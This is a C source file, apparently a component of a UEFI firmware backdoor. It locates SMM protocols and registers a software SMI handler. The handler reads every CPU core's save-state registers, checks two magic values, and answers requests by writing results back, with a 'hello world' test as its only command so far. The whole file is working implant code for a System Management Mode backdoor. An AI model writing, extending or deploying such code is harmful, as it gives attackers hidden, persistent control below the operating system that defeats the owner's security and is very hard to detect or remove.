#include "smm.h"
#include "AutoGen.h"
#include "Framework/SmmCis.h"
#include "Protocol/SmmCpu.h"
#include "Protocol/SmmSwDispatch.h"
#include "Protocol/SmmPeriodicTimerDispatch.h"
#include "efivars.h"
#include "globals.h"

#include "ioctl.h"

static EFI_SMM_SYSTEM_TABLE* gStmt;
static EFI_SMM_BASE_PROTOCOL* gSmmBase;
static EFI_SMM_SW_DISPATCH_PROTOCOL* gSwDispatch;
static EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL* gPeriodicTimer;
static EFI_SMM_CPU_PROTOCOL* gSmmCpu;

static EFI_HANDLE gBackdoorIsrHandle;
static EFI_SMM_SW_DISPATCH_CONTEXT gBackdoorIsrCtx = {
    .SwSmiInputValue = API_BACKDOOR_CALL
};

static const UINT64 BACKDOOR_CALL_REGISTERS[] = {
    EFI_SMM_SAVE_STATE_REGISTER_RSI,
    EFI_SMM_SAVE_STATE_REGISTER_RDI,
    EFI_SMM_SAVE_STATE_REGISTER_RCX,
    EFI_SMM_SAVE_STATE_REGISTER_RDX,
    EFI_SMM_SAVE_STATE_REGISTER_R8,
    EFI_SMM_SAVE_STATE_REGISTER_R9
};

static void backdoor_read_params(struct BackdoorParams* params, UINT32 cpu) {
    for (UINT32 i=0; i < 6; ++i) {
        gSmmCpu->ReadSaveState(
                    gSmmCpu, sizeof(params->r[i]), BACKDOOR_CALL_REGISTERS[i], cpu, (void *) &params->r[i]
                );
    }
}

static void backdoor_write_params(struct BackdoorParams* params, UINT32 cpu) {
    for (UINT32 i=0; i < 6; ++i) {
        gSmmCpu->WriteSaveState(
                    gSmmCpu, sizeof(params->r[i]), BACKDOOR_CALL_REGISTERS[i], cpu, (const void *) &params->r[i]
                );
    }
}

static BOOLEAN is_valid_request(struct BackdoorParams* params) {
    return params->r[4] == BACKDOOR_MAGIC1 && params->r[5] == BACKDOOR_MAGIC2;
}

static void backdoor_api_hello_world_test(struct BackdoorParams* params) {
    params->r[0] = 0xDEADBEEFDEADBEEF;
    params->r[1] = 0x4141414141414141;
    params->r[2] = 0x4242424242424242;
    params->r[3] = 0x1337133773317331;
    params->r[4] = 0x4141414141414141;
    params->r[5] = 0x4141414141414141;
}

static void handle_cpu_core(UINT32 cpu) {
    struct BackdoorParams params;
    backdoor_read_params(&params, cpu);

    if (is_valid_request(&params)) {
        const UINT8 request = params.r[0] & 0xFF;

        switch (request) {
            case BACKDOOR_HELLO_WORLD_TEST:
                backdoor_api_hello_world_test(&params);
                break;
        }

        backdoor_write_params(&params, cpu);
    }
}

static void EFIAPI backdoor_smi_handler(EFI_HANDLE dispatch_handle, EFI_SMM_SW_DISPATCH_CONTEXT * dispatch_ctx) {
    for (UINT32 i=0; i < gStmt->NumberOfCpus; ++i) {
        handle_cpu_core(i);
    }
}

void backdoor_smm_entry(EFI_SMM_BASE_PROTOCOL* smm_base) {
    gSmmBase = smm_base;
    EFI_STATUS status = smm_base->GetSmstLocation(smm_base, &gStmt);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannto get EFI_SMM_STATUS_TABLE");
        return;
    } 

    status = gBS->LocateProtocol(&gEfiSmmSwDispatchProtocolGuid, NULL, (void **) &gSwDispatch);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_SW_DISPATCH_PROTOCOL");
        return;
    }

    status = gBS->LocateProtocol(&gEfiSmmPeriodicTimerDispatchProtocolGuid, NULL, (void **) &gPeriodicTimer);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL");
        return;
    }

    status = gBS->LocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (void **) &gSmmCpu);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot get EFI_SMM_CPU_PROTOCOL");
        return;
    }

    status = gSwDispatch->Register(gSwDispatch, &backdoor_smi_handler, &gBackdoorIsrCtx, &gBackdoorIsrHandle);
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(SmmVar, "Error: Cannot register SMI handler.");
        return;
    }

    set_backdoor_efivar_str(SmmVar, "SMM_INIT_OK");
}
